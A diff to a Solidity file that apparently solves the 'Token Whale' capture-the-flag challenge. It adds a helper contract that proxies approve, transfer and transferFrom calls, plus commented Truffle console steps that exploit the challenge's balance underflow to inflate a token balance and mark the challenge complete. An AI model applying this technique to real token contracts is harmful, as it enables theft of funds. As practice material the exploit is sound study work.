@@ -2,12 +2,71 @@ pragma solidity ^0.4.21;
 
 import './OtherContract.sol';
 
+/*
+var tokenWhaleChallenge = await TokenWhaleChallenge.deployed();
+var tokenWhaleHelper = await TokenWhaleHelper.deployed();
+await tokenWhaleChallenge.approve(tokenWhaleHelper.address, 1000000000000)
+await tokenWhaleHelper.steal()
+
+tokenWhaleChallenge.balanceOf(accounts[0])
+tokenWhaleChallenge.approve(accounts[0], 1000000000000)
+tokenWhaleChallenge.transferFrom(accounts[0], tokenWhaleHelper.address, 500)
+tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)
+
+tokenWhaleHelper.approve(tokenWhaleHelper.address, 1000000000000)
+await tokenWhaleHelper.transferFrom(accounts[0], accounts[0], 1)
+
+
+
+var tokenWhaleChallenge = await TokenWhaleChallenge.deployed();
+var tokenWhaleHelper = await TokenWhaleHelper.deployed();
+(await tokenWhaleChallenge.balanceOf(accounts[0])).toNumber();
+(await tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)).toNumber()
+await tokenWhaleChallenge.approve(tokenWhaleHelper.address, 1000000000000)
+await tokenWhaleHelper.transferFrom(accounts[0], accounts[0], 1)
+await tokenWhaleHelper.approve(tokenWhaleHelper.address, 9999999999)
+await tokenWhaleHelper.transferFrom(tokenWhaleHelper.address, accounts[0], 9999999999)
+(await tokenWhaleChallenge.balanceOf(accounts[0])).toNumber()
+(await tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)).toString()
+await tokenWhaleChallenge.isComplete()
+*/
+
 contract TokenWhaleHelper is OtherContract {
     function() public payable { 
     }
 
     function withdraw() public {
         msg.sender.transfer(address(this).balance);
+    }
+
+    function getBalance(address requested) public view returns (uint256) {
+        require(otherContract != 0);
+        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
+        return tokenWhaleChallenge.balanceOf(requested);
+    }
+
+    function isComplete() public view returns (bool) {
+        require(otherContract != 0);
+        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
+        return tokenWhaleChallenge.isComplete();
+    }
+
+    function approve(address spender, uint256 value) public {
+        require(otherContract != 0);
+        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
+        tokenWhaleChallenge.approve(spender, value);
+    }
+
+    function transfer(address to, uint256 value) public {
+        require(otherContract != 0);
+        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
+        tokenWhaleChallenge.transfer(to, value);
+    }
+
+    function transferFrom(address from, address to, uint256 value) public {
+        require(otherContract != 0);
+        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
+        tokenWhaleChallenge.transferFrom(from, to, value);
     }
 }
 
